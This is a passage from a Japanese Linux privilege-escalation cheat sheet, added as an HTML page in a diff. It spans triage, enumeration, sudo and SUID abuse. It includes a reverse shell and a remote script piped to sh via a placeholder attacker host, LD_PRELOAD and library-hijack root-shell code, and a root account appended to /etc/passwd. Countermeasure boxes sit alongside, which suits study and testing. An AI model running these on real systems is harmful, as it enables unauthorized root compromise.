@@ -1,0 +1,918 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Linux Privilege Escalation — d0me</title>
+<meta name="description" content="Linux 権限昇格 — 初動トリアージから sudo / SUID / capability / cron / polkit / container escape / kernel exploit まで、経路の探索順と判断基準を実務ベースで整理したリファレンス。">
+<link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Zen+Kaku+Gothic+New:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/sheet.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
+    <button class="nav-toggle" aria-label="メニュー">≡</button>
+    <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
+  </div>
+</header>
+
+<main>
+<section class="sheet-hero">
+  <div class="wrap">
+    <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>Linux Privilege Escalation</div>
+    <h1>Linux Privilege Escalation</h1>
+    <p class="lede">From unprivileged shell to root — enumeration order, decision criteria per vector, and the exploit paths worth spending time on.<span class="jp">非特権 shell から root までの経路を、探索順と判断基準で整理する。Windows 側の同等資料は <a href="situational-awareness.html">situational-awareness</a>、防御側の設定値は <a href="hardening.html">hardening</a>、取得後の横展開は <a href="lateral-movement.html">lateral-movement</a> を参照。</span></p>
+  </div>
+</section>
+
+<div class="wrap">
+<section class="attack-flow" aria-label="Linux privesc decision flow">
+  <div class="flow-head">
+    <span class="hx">##</span>
+    <span class="fl-label">Escalation Path</span>
+    <span class="fl-jp">昇格の判断フロー</span>
+    <span class="rt">click each phase to jump →</span>
+  </div>
+  <div class="flow-chain">
+    <a class="flow-phase" href="#s01"><span class="p-num">P1</span><span class="p-title">Triage</span><span class="p-jp">足場確認</span><span class="p-techs">tty · id · os · writable · noexec</span></a>
+    <a class="flow-phase" href="#s02"><span class="p-num">P2</span><span class="p-title">Enumerate</span><span class="p-jp">列挙</span><span class="p-techs">linpeas · lse · pspy · manual</span></a>
+    <a class="flow-phase" href="#s03"><span class="p-num">P3</span><span class="p-title">Misconfig</span><span class="p-jp">設定不備</span><span class="p-techs">sudo · SUID · cap · cron · service</span></a>
+    <a class="flow-phase" href="#s08"><span class="p-num">P4</span><span class="p-title">Credential</span><span class="p-jp">認証材料</span><span class="p-techs">history · key · shadow · keyring</span></a>
+    <a class="flow-phase" href="#s11"><span class="p-num">P5</span><span class="p-title">Exploit</span><span class="p-jp">最終手段</span><span class="p-techs">kernel · glibc · polkit</span></a>
+  </div>
+</section>
+</div>
+
+<div class="wrap">
+<div class="sheet-layout">
+  <aside class="toc">
+    <div class="toc-label">目次</div>
+    <ul>
+      <li><a href="#s01">01 Foothold Triage</a></li>
+      <li><a href="#s02">02 Enumeration</a></li>
+      <li><a href="#s03">03 sudo</a></li>
+      <li><a href="#s04">04 SUID / SGID</a></li>
+      <li><a href="#s05">05 Capabilities</a></li>
+      <li><a href="#s06">06 Scheduled Exec</a></li>
+      <li><a href="#s07">07 Service / polkit</a></li>
+      <li><a href="#s08">08 Credential Hunting</a></li>
+      <li><a href="#s09">09 Filesystem / Mount</a></li>
+      <li><a href="#s10">10 Container Escape</a></li>
+      <li><a href="#s11">11 Kernel / Userland Exploit</a></li>
+      <li><a href="#s12">12 Detection &amp; Hardening</a></li>
+      <li><a href="#ref">13 References</a></li>
+    </ul>
+  </aside>
+
+  <article class="doc">
+
+    <section id="s01" class="reveal">
+      <h2><span class="num">01</span>Foothold Triage<span class="jp">初動トリアージ</span></h2>
+      <p>shell を取った直後の 2〜3 分で確定させるべき項目がある。ここを飛ばして自動列挙ツールを走らせると、<strong>ツールが動かない理由(noexec / インタプリタ不在 / TTY なし)を後から潰す羽目になる</strong>。順序は tty 安定化 → 自分の権限 → OS 情報 → 実行可能領域、が実務的に最短。</p>
+
+      <h3 id="tty">TTY 安定化</h3>
+      <p>reverse shell 直後は job control も tab 補完も効かず、<code>su</code> / <code>ssh</code> / <code>sudo</code> がパスワード入力で必ず失敗する。ここを先に対処する。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 1) pty を割り当てる (python3 が最優先、なければ順に落とす)</span>
+python3 -c <span class="s">'import pty;pty.spawn("/bin/bash")'</span>
+script -qc /bin/bash /dev/null          <span class="c"># python 不在時の定番</span>
+perl -e <span class="s">'exec "/bin/bash";'</span>
+<span class="c"># busybox しかない極小環境</span>
+busybox sh
+
+<span class="c"># 2) ここで Ctrl-Z して attacker 側に戻る</span>
+stty raw -echo; fg
+<span class="c"># 3) shell 側に戻ったら端末情報を渡す (行が折り返さない / clear が使えるようになる)</span>
+export TERM=xterm-256color SHELL=/bin/bash
+stty rows <span class="v">&lt;ROWS&gt;</span> cols <span class="v">&lt;COLS&gt;</span>    <span class="c"># attacker 側の stty size の値をそのまま</span>
+
+<span class="c"># socat を両側に置けるなら最初から完全な pty が取れる (最も安定)</span>
+<span class="c"># attacker:</span> socat file:`tty`,raw,echo=0 tcp-listen:<span class="v">&lt;LPORT&gt;</span>
+<span class="c"># victim:</span>   socat exec:<span class="s">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:<span class="v">&lt;LHOST&gt;</span>:<span class="v">&lt;LPORT&gt;</span></code></pre></div>
+      <div class="note"><span class="lbl">note</span><code>stty raw -echo; fg</code> を実行した直後の画面は何も表示されないことが多い。Enter を 1 回叩けばプロンプトが戻る。ここで慌てて Ctrl-C を押すと元の shell ごと落ちる。</div>
+
+      <h3 id="who-where">自分の権限と OS 情報</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>id; whoami; groups
+uname -a; cat /etc/os-release; arch
+hostname; hostname -f
+cat /proc/version                       <span class="c"># gcc バージョン → exploit のビルド互換性判断に使える</span>
+
+<span class="c"># 所属グループだけで即座に昇格できる場合がある (下表)</span>
+id | grep -oE <span class="s">'docker|lxd|lxc|disk|adm|sudo|wheel|shadow|video|kvm'</span>
+
+<span class="c"># 他ユーザとログイン状況</span>
+cat /etc/passwd | grep -vE <span class="s">'nologin|false'</span>
+w; last -n 20; ls -la /home</code></pre></div>
+
+      <h3 id="group-table">昇格に有効なグループ早見表</h3>
+      <table>
+        <thead><tr><th>group</th><th>何ができるか</th><th>root への距離</th></tr></thead>
+        <tbody>
+          <tr><td><code>docker</code></td><td>host / を任意コンテナに mount</td><td>ほぼ即時 — <a href="#s10">s10</a></td></tr>
+          <tr><td><code>lxd</code> / <code>lxc</code></td><td>privileged container を作成し host を mount</td><td>ほぼ即時 — <a href="#s10">s10</a></td></tr>
+          <tr><td><code>disk</code></td><td><code>/dev/sda</code> 等へ raw 読み書き (<code>debugfs</code> で /etc/shadow 読取)</td><td>ほぼ即時</td></tr>
+          <tr><td><code>shadow</code></td><td><code>/etc/shadow</code> 読取 → offline crack</td><td>hash 次第</td></tr>
+          <tr><td><code>adm</code></td><td><code>/var/log</code> 読取 (認証情報が落ちていることがある)</td><td>間接 — <a href="#s08">s08</a></td></tr>
+          <tr><td><code>sudo</code> / <code>wheel</code></td><td>パスワードを持っていれば全能</td><td>パスワード次第 — <a href="#s03">s03</a></td></tr>
+          <tr><td><code>video</code></td><td>フレームバッファ読取 (画面キャプチャ)</td><td>間接</td></tr>
+        </tbody>
+      </table>
+
+      <h3 id="writable">書込・実行可能領域の確定</h3>
+      <p>exploit をコンパイルする・ツールを落とす前に、<strong>どこが書けてどこが実行できるか</strong>を確定させる。<code>/tmp</code> が <code>noexec</code> の環境は珍しくない。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># mount option を先に見る (noexec / nosuid / ro)</span>
+mount | column -t | grep -E <span class="s">'noexec|nosuid|/tmp|/dev/shm|/home|/var'</span>
+findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS
+
+<span class="c"># 実際に実行できるか試す (option を見るより確実)</span>
+for d in /tmp /dev/shm /var/tmp /run/user/$(id -u) $HOME; do
+  printf <span class="s">'#!/bin/sh\necho ok'</span> &gt; $d/.x 2&gt;/dev/null &amp;&amp; chmod +x $d/.x 2&gt;/dev/null \
+    &amp;&amp; echo <span class="s">"$d: $($d/.x 2&gt;&amp;1)"</span>; rm -f $d/.x
+done
+
+<span class="c"># ビルド環境の有無</span>
+which gcc cc clang make python3 python perl ruby php curl wget nc socat 2&gt;/dev/null</code></pre></div>
+      <div class="note warn"><span class="lbl">warn</span>全領域が <code>noexec</code> の場合でも手詰まりではない。(a) ELF を <code>/lib64/ld-linux-x86-64.so.2 ./binary</code> で loader 経由起動する、(b) <code>memfd_create</code> にファイルを載せて <code>/proc/self/fd/N</code> から実行する、(c) そもそもインタプリタ (python / perl / bash) は <code>noexec</code> の影響を受けないのでスクリプトに書き換える、の 3 択がある。(c) が最も確実。</div>
+
+      <h3 id="net-position">ネットワーク位置</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>ip -c a; ip route
+ss -tulpn                               <span class="c"># localhost bind のみのサービスが昇格経路になりやすい</span>
+ss -tulpn | grep -E <span class="s">'127\.0\.0\.1|::1'</span>
+cat /etc/hosts; cat /etc/resolv.conf
+arp -a 2&gt;/dev/null || ip neigh</code></pre></div>
+      <p><code>127.0.0.1</code> にしか bind していない service (MySQL / Redis / Jenkins / 内部 API) は外から触れないぶん認証が緩いことが多く、s07 の主要な狙い目になる。到達手段は <a href="lateral-movement.html#s10">lateral-movement s10</a> の pivot を使う。</p>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>tty 安定化を先にやらないと <code>su</code> / <code>sudo</code> が必ず失敗し、原因の切り分けに時間を浪費する</li>
+          <li>グループ所属は <code>id</code> 一発で分かるうえ <code>docker</code> / <code>lxd</code> / <code>disk</code> はほぼ即 root。列挙ツールより先に見る</li>
+          <li><code>noexec</code> は mount option を読むより実際に実行して確かめるほうが速く確実</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s02" class="reveal">
+      <h2><span class="num">02</span>Enumeration<span class="jp">列挙</span></h2>
+      <p>自動列挙ツールは<strong>見落としの保険</strong>であって一次手段ではない。出力の 9 割は雑音で、赤色が付いていても外れが多い。s01 の手動確認で見当がついているときは、該当箇所だけを手で掘るほうが速い。逆に完全に手がかりがない場合と、engagement 終盤の取りこぼし確認には有効。</p>
+
+      <h3 id="tool-compare">ツール比較</h3>
+      <table>
+        <thead><tr><th>tool</th><th>得意</th><th>実行時間の目安</th><th>痕跡・注意</th></tr></thead>
+        <tbody>
+          <tr><td><code>linpeas.sh</code></td><td>網羅性が最も高い。cap / sudo / cron / cred / CVE を一括</td><td>1〜5 分</td><td>出力が膨大。プロセス生成が非常に多く EDR/auditd で目立つ</td></tr>
+          <tr><td><code>lse.sh</code> (linux-smart-enumeration)</td><td>レベル制御 (<code>-l0/-l1/-l2</code>) で雑音を段階的に増やせる</td><td>30 秒〜2 分</td><td>まず <code>-l1</code>。linpeas より読みやすい</td></tr>
+          <tr><td><code>pspy64</code></td><td><strong>他ツールでは絶対に見えない</strong> — 実行中の cron / 短命プロセスの引数</td><td>常駐 (5〜10 分は回す)</td><td>root 不要で <code>/proc</code> を polling。CPU を食う</td></tr>
+          <tr><td><code>LinEnum.sh</code></td><td>軽量・古典的。出力が素直</td><td>30 秒</td><td>更新が止まって久しく新しい CVE は拾わない</td></tr>
+          <tr><td><code>linux-exploit-suggester-2</code></td><td>kernel バージョン → 候補 CVE</td><td>数秒</td><td>偽陽性が非常に多い。distro backport を見ない — <a href="#s11">s11</a></td></tr>
+          <tr><td><code>unix-privesc-check</code></td><td>パーミッション網羅チェック</td><td>1〜3 分</td><td>古いが SUID / 書込可能設定ファイルの洗い出しは堅実</td></tr>
+        </tbody>
+      </table>
+
+      <h3 id="run-linpeas">実行パターン</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># ディスクに落とさずメモリ経由で実行 (痕跡最小、ただし egress 必要)</span>
+curl -sL http://<span class="v">&lt;LHOST&gt;</span>/linpeas.sh | sh
+wget -qO- http://<span class="v">&lt;LHOST&gt;</span>/linpeas.sh | sh
+
+<span class="c"># 色付きのままログに残す → attacker 側で less -R して読む</span>
+./linpeas.sh -a 2&gt;&amp;1 | tee linpeas.log     <span class="c"># -a: 全チェック (時間はかかる)</span>
+./linpeas.sh -q -N                         <span class="c"># -q: banner 省略, -N: 色なし。grep/tee 用</span>
+
+<span class="c"># lse は段階的に</span>
+./lse.sh -l1 -c -i  <span class="c"># -c: 色なし, -i: 非対話, -l1: 昇格に有効な情報のみ。まずここ</span>
+./lse.sh -l2 -c -i  <span class="c"># -l2: 全情報を dump (かなり長い)</span>
+
+<span class="c"># pspy は「放置して待つ」のが正しい使い方</span>
+./pspy64 -pf -i 1000        <span class="c"># -p: プロセス, -f: ファイル event, -i: 1s 間隔</span>
+./pspy64 -r /home -r /etc   <span class="c"># 監視対象ディレクトリを絞る</span></code></pre></div>
+      <p>転送手段 (HTTP / SMB / base64 / in-memory) の詳細は <a href="tooling.html">File Transfer</a> 巻。</p>
+
+      <h3 id="pspy-value">pspy でしか取れないもの</h3>
+      <p>静的な列挙では、<strong>「1 分ごとに root が動かしているスクリプト」</strong>は crontab が読めない限り見えない。<code>/etc/crontab</code> や <code>/etc/cron.d</code> は誰でも読めるが、<code>/var/spool/cron/crontabs/root</code> は読めない。pspy はここを埋める。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># pspy 出力の読み方 — UID=0 の行だけを追う</span>
+./pspy64 -pf | grep <span class="s">'UID=0'</span>
+
+<span class="c"># 典型的な当たり:</span>
+<span class="c"># UID=0 PID=1234 | /bin/bash /opt/scripts/backup.sh        → script が書込可能か確認</span>
+<span class="c"># UID=0 PID=1235 | tar czf /backup/x.tgz /var/www/*         → wildcard injection (s06)</span>
+<span class="c"># UID=0 PID=1236 | mysql -u root -pS3cr3t                    → 引数に平文パスワード</span>
+<span class="c"># UID=0 PID=1237 | /usr/bin/python /opt/app/run.py           → import 可能な module 名を探す</span></code></pre></div>
+      <div class="note"><span class="lbl">note</span>プロセス引数に平文パスワードが乗るのは Linux 側で頻出する。<code>ps aux</code> は「その瞬間」しか見えないため、1 秒未満で終わる cron のパスワード引数は pspy でしか捕まらない。CTF に限らず実環境のバックアップスクリプトで日常的に起きている。</div>
+
+      <h3 id="manual-quick">手動クイックスイープ</h3>
+      <p>ツールが落とせない・実行できない場合の最小セット。この 8 行で経路の 7 割は見当がつく。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>sudo -l 2&gt;/dev/null
+find / -perm -4000 -type f 2&gt;/dev/null
+getcap -r / 2&gt;/dev/null
+cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.*/ 2&gt;/dev/null
+ss -tulpn | grep -E <span class="s">'127\.0\.0\.1|::1'</span>
+find / -writable -type d 2&gt;/dev/null | grep -vE <span class="s">'^/(proc|sys|dev|run)'</span> | head -40
+ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/ 2&gt;/dev/null
+find / -name <span class="s">'*.sh'</span> -writable -type f 2&gt;/dev/null | grep -vE <span class="s">"^$HOME|^/proc"</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li><code>auditd</code> で <code>/tmp</code> <code>/dev/shm</code> 配下からの <code>execve</code> を記録する。列挙スクリプトの実行はここでほぼ確実に引っかかる</li>
+          <li>linpeas は短時間に数百〜数千のプロセスを生成する。プロセス生成レートの異常値は EDR / Falco の単純な閾値ルールで検知できる</li>
+          <li><code>/proc</code> の <code>hidepid=2</code> mount option で他ユーザのプロセス情報を隠すと pspy の有効性が大きく落ちる</li>
+          <li>cron ジョブでの認証情報は引数渡しをやめ、mode 600 の設定ファイル (<code>~/.my.cnf</code> 等) から読ませる</li>
+        </ul>
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>自動ツールは保険。s01 で見当がついているなら手で掘るほうが速い</li>
+          <li>pspy は静的列挙の死角 (root の cron・短命プロセスの引数) を埋める唯一の手段。5〜10 分は放置する</li>
+          <li>linpeas の赤色は偽陽性が多い。裏取りせずに時間を使わない</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s03" class="reveal">
+      <h2><span class="num">03</span>sudo Misconfiguration<span class="jp">sudo 設定不備</span></h2>
+      <p>最も高頻度で、最も静か。<code>sudo -l</code> が何かを返した時点で、<strong>まず GTFOBins を引く</strong>。sudo 経由の実行は監査ログに残るが root への昇格自体は正規機能なので、単独では検知されにくい。</p>
+
+      <h3 id="sudo-l">sudo -l の読解</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>sudo -l          <span class="c"># パスワードを聞かれる場合、既知パスワードがなければ NOPASSWD 行だけが希望</span>
+
+<span class="c"># 出力の読み方:</span>
+<span class="c"># (root) NOPASSWD: /usr/bin/find      → GTFOBins find: sudo find . -exec /bin/sh \; -quit</span>
+<span class="c"># (ALL : ALL) ALL                     → sudo su - で即終了 (要パスワード)</span>
+<span class="c"># (root) NOPASSWD: /opt/backup.sh     → スクリプトが書込可能なら中身を書き換える</span>
+<span class="c"># env_keep+=LD_PRELOAD               → 下の LD_PRELOAD 経路 (これは強力)</span>
+<span class="c"># !env_reset / SETENV                 → 環境変数を持ち込める = 危険</span></code></pre></div>
+
+      <h3 id="gtfobins">GTFOBins パターン (sudo 経由)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 代表例。https://gtfobins.github.io で許可された binary 名を引く</span>
+sudo find . -exec /bin/sh \; -quit
+sudo vim -c <span class="s">':!/bin/sh'</span>
+sudo less /etc/profile          <span class="c"># less 内で !/bin/sh</span>
+sudo awk <span class="s">'BEGIN{system("/bin/sh")}'</span>
+sudo env /bin/sh
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+sudo python3 -c <span class="s">'import os;os.system("/bin/sh")'</span>
+sudo -u#-1 /bin/bash            <span class="c"># CVE-2019-14287: Runas に ALL, !root があっても uid -1 → 0</span></code></pre></div>
+
+      <h3 id="ld-preload">LD_PRELOAD / LD_LIBRARY_PATH</h3>
+      <p><code>env_keep</code> に <code>LD_PRELOAD</code> または <code>LD_LIBRARY_PATH</code> が残っていれば、<strong>許可されている binary が何であっても</strong>任意コードが root で走る。GTFOBins に載っていない binary でも通る、汎用性の高い経路。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">c</span><button class="copy">copy</button></div><pre><code><span class="c">// shell.c — コンパイルして LD_PRELOAD で読ませる</span>
+<span class="k">#include</span> <span class="s">&lt;stdio.h&gt;</span>
+<span class="k">#include</span> <span class="s">&lt;stdlib.h&gt;</span>
+<span class="k">#include</span> <span class="s">&lt;unistd.h&gt;</span>
+<span class="k">void</span> _init() {
+    unsetenv(<span class="s">"LD_PRELOAD"</span>);
+    setgid(0); setuid(0);
+    system(<span class="s">"/bin/bash -p"</span>);
+}</code></pre></div>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
+<span class="c"># env_keep+=LD_PRELOAD がある場合 (許可 binary は何でもよい):</span>
+sudo LD_PRELOAD=/tmp/shell.so <span class="v">&lt;ANY_ALLOWED_BINARY&gt;</span>
+
+<span class="c"># env_keep+=LD_LIBRARY_PATH の場合 — 許可 binary が依存する .so を偽装</span>
+ldd $(which <span class="v">&lt;ALLOWED_BINARY&gt;</span>)          <span class="c"># どの lib を読むか確認</span>
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC hijack.c   <span class="c"># 読まれる名前で用意</span>
+sudo LD_LIBRARY_PATH=/tmp <span class="v">&lt;ALLOWED_BINARY&gt;</span></code></pre></div>
+
+      <h3 id="sudo-cve">sudo 本体の CVE</h3>
+      <p>sudoers に一切ルールが無くても成立する CVE がある。<code>sudo --version</code> でバージョンを確認する。</p>
+      <table>
+        <thead><tr><th>CVE</th><th>対象バージョン</th><th>条件</th><th>効果</th></tr></thead>
+        <tbody>
+          <tr><td><strong>CVE-2025-32463</strong></td><td>1.9.14 – 1.9.17</td><td>sudo が導入済みなら sudoers ルール不要</td><td><code>-R</code> (chroot) + 偽 <code>/etc/nsswitch.conf</code> で任意 .so を root load</td></tr>
+          <tr><td>CVE-2025-32462</td><td>&lt; 1.9.17p1</td><td>sudoers に <code>Host</code>/<code>Host_Alias</code> 制限あり</td><td><code>-h</code> で別ホスト向けルールを誤適用</td></tr>
+          <tr><td>CVE-2023-22809</td><td>1.8.0 – 1.9.12p1</td><td><code>sudoedit</code> / <code>sudo -e</code> 権限</td><td><code>EDITOR=vi -- /etc/shadow</code> で任意ファイル編集</td></tr>
+          <tr><td>CVE-2021-3156 (Baron Samedit)</td><td>1.8.2 – 1.9.5p1</td><td>誰でも (sudoers 不要)</td><td>heap overflow → root。ほぼ全 distro で成立した</td></tr>
+          <tr><td>CVE-2019-14287</td><td>&lt; 1.8.28</td><td>Runas に <code>ALL, !root</code></td><td><code>sudo -u#-1</code> で uid 0</td></tr>
+        </tbody>
+      </table>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># CVE-2025-32463 (Stratascale / chwoot) の骨子 — chroot 先に偽 nsswitch を置く</span>
+sudo --version | head -1        <span class="c"># 1.9.14〜1.9.17 なら候補</span>
+<span class="c"># PoC は fake chroot dir に /etc/nsswitch.conf と libnss_ 系 .so を配置し</span>
+<span class="c"># sudo -R &lt;dir&gt; で NSS lookup 経由の任意 .so ロードを root context で誘発する</span>
+<span class="c"># 公開 PoC: github.com/pr0v3rbs/CVE-2025-32463_chwoot</span></code></pre></div>
+
+      <h3 id="sudo-token">sudo token 再利用</h3>
+      <p>対象ユーザが直近で <code>sudo</code> を成功させていれば、<code>/run/sudo/ts/&lt;user&gt;</code> にタイムスタンプトークンが残る。同一ユーザの別プロセスを取れているなら、<code>gdb</code> でそのプロセスに ptrace してトークン時刻を書き換え、パスワードなしで <code>sudo</code> を通せる (要 <code>kernel.yama.ptrace_scope=0</code>)。</p>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>sudoers から <code>env_keep</code> の <code>LD_PRELOAD</code> / <code>LD_LIBRARY_PATH</code> を排除。既定の <code>env_reset</code> を維持する</li>
+          <li>NOPASSWD で許可する binary は GTFOBins に載っていないものだけに限定。shell 脱出可能な binary (find/vim/awk/tar/less…) を渡さない</li>
+          <li>sudo を 1.9.17p1 以上へ。<code>--chroot</code>/<code>-R</code> は deprecated。使っていないなら明示的に無効化</li>
+          <li><code>kernel.yama.ptrace_scope=1</code> 以上で sudo token の ptrace 再利用を封じる</li>
+          <li>auditd で <code>sudo</code> の <code>execve</code> と <code>/run/sudo/ts</code> への書込を監視</li>
+        </ul>
+      </div>
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li><code>sudo -l</code> が何か返したら反射的に GTFOBins。shell 脱出の可否がすべて</li>
+          <li><code>LD_PRELOAD</code> が env_keep に残っていれば許可 binary が何であっても勝ち</li>
+          <li>CVE-2025-32463 は sudoers ルールが空でも刺さる。1.9.14〜1.9.17 は即確認</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s04" class="reveal">
+      <h2><span class="num">04</span>SUID / SGID<span class="jp">SUID / SGID バイナリ</span></h2>
+      <p>SUID bit の付いた binary は実行時に所有者(多くは root)の権限を得る。手順は「列挙 → 既知 binary は GTFOBins → 非標準 binary は個別解析」。</p>
+
+      <h3 id="find-suid">列挙</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># SUID</span>
+find / -perm -4000 -type f 2&gt;/dev/null
+<span class="c"># SGID</span>
+find / -perm -2000 -type f 2&gt;/dev/null
+<span class="c"># 両方 + 所有者・サイズ表示 (非標準を目視で拾う)</span>
+find / -perm -u=s -type f -exec ls -la {} \; 2&gt;/dev/null
+
+<span class="c"># 「標準の SUID 集合」を引き算して非標準だけ残すのが実務的</span>
+<span class="c"># 見慣れない名前 / /opt /home /usr/local 配下 / 自作っぽい binary が当たり</span></code></pre></div>
+      <div class="note"><span class="lbl">note</span>ディストリ標準の SUID (<code>passwd</code>, <code>su</code>, <code>sudo</code>, <code>mount</code>, <code>umount</code>, <code>ping</code>, <code>pkexec</code>, <code>newgrp</code>, <code>chsh</code>, <code>chfn</code>, <code>gpasswd</code>) は既知 CVE がない限り素通りする。<code>pkexec</code> だけは例外で CVE-2021-4034 (PwnKit) を必ず確認 — <a href="#s07">s07</a>。</div>
+
+      <h3 id="suid-gtfo">既知 binary の GTFOBins パターン</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># SUID 版は -p でカレント権限を維持するのがポイント</span>
+./bash -p                              <span class="c"># SUID bash なら一発</span>
+./find . -exec /bin/sh -p \; -quit
+./nmap --interactive                   <span class="c"># 旧 nmap (2.02-5.21) の対話モード</span>
+./vim -c <span class="s">':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'</span>
+./env /bin/sh -p
+./cp --help                            <span class="c"># cp は GTFOBins で /etc/shadow 上書き等の技あり</span>
+
+<span class="c"># 読み書き系 SUID は shell が取れなくても /etc/passwd に root ユーザを追記できる</span>
+echo <span class="s">'r00t:$(openssl passwd -1 -salt x pass):0:0::/root:/bin/bash'</span> | ./tee -a /etc/passwd</code></pre></div>
+
+      <h3 id="shared-lib-hijack">共有ライブラリ hijack</h3>
+      <p>非標準 SUID binary が<strong>書込可能な .so を読む</strong>、または<strong>存在しない .so を探しに行く</strong>場合、そこに悪意ある .so を置けば root で実行される。GTFOBins に無い binary への汎用アプローチ。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 1) SUID binary が読む .so を洗い出す</span>
+ldd /path/to/suid_binary
+<span class="c"># 2) strace / ltrace で「探して見つからなかった .so」を拾う (これが狙い目)</span>
+strace /path/to/suid_binary 2&gt;&amp;1 | grep -E <span class="s">'open.*\.so.*ENOENT|No such'</span>
+<span class="c"># 3) RUNPATH/RPATH に書込可能ディレクトリがないか</span>
+readelf -d /path/to/suid_binary | grep -E <span class="s">'RPATH|RUNPATH'</span>
+objdump -p /path/to/suid_binary | grep -E <span class="s">'RPATH|RUNPATH'</span></code></pre></div>
+      <div class="code"><div class="code-bar"><span class="code-lang">c</span><button class="copy">copy</button></div><pre><code><span class="c">// 見つからなかった .so 名で用意。constructor が root で走る</span>
+<span class="k">#include</span> <span class="s">&lt;stdlib.h&gt;</span>
+<span class="k">__attribute__</span>((constructor)) <span class="k">void</span> init() {
+    setuid(0); setgid(0);
+    system(<span class="s">"/bin/bash -p"</span>);
+}
+<span class="c">// gcc -shared -fPIC -o /writable/path/missing.so hijack.c</span></code></pre></div>
+
+      <h3 id="path-hijack">PATH 相対参照の hijack</h3>
+      <p>SUID binary が絶対パスなしで別コマンドを呼ぶ(<code>system("service …")</code> のような実装)場合、<code>PATH</code> を差し替えて偽コマンドを掴ませる。<code>strings</code> で相対コマンド名を探す。</p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code>strings /path/to/suid_binary | grep -E <span class="s">'^[a-z_-]+$'</span>   <span class="c"># 呼ばれていそうなコマンド名</span>
+<span class="c"># 例: binary が "service" を相対で呼ぶ場合</span>
+echo <span class="s">'/bin/bash -p'</span> &gt; /tmp/service; chmod +x /tmp/service
+PATH=/tmp:$PATH /path/to/suid_binary</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>SUID 集合を最小化。標準セット以外を棚卸しし、不要な bit を <code>chmod u-s</code> で除去 (<a href="hardening.html">hardening</a> と対で管理)</li>
+          <li>ユーザ書込可能な filesystem を <code>nosuid</code> で mount。<code>/home</code> <code>/tmp</code> <code>/var/tmp</code> <code>/dev/shm</code> は特に</li>
+          <li>自作 SUID は絶対パスでコマンド呼び出しし、<code>secure_getenv</code> を使い、動的リンクを避ける (static build)</li>
+          <li>AIDE / integrity monitoring で SUID bit の新規付与を検知する</li>
+        </ul>
+      </div>
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>標準 SUID は引き算。<code>/opt</code> <code>/home</code> <code>/usr/local</code> 配下と見慣れない名前が本命</li>
+          <li>GTFOBins に無い binary は <code>ldd</code>/<code>strace</code>/<code>readelf</code> で .so hijack か PATH hijack に持ち込む</li>
+          <li>shell が取れない読み書き SUID でも <code>/etc/passwd</code> 追記で勝てる</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s05" class="reveal">
+      <h2><span class="num">05</span>Capabilities<span class="jp">ファイル capability</span></h2>
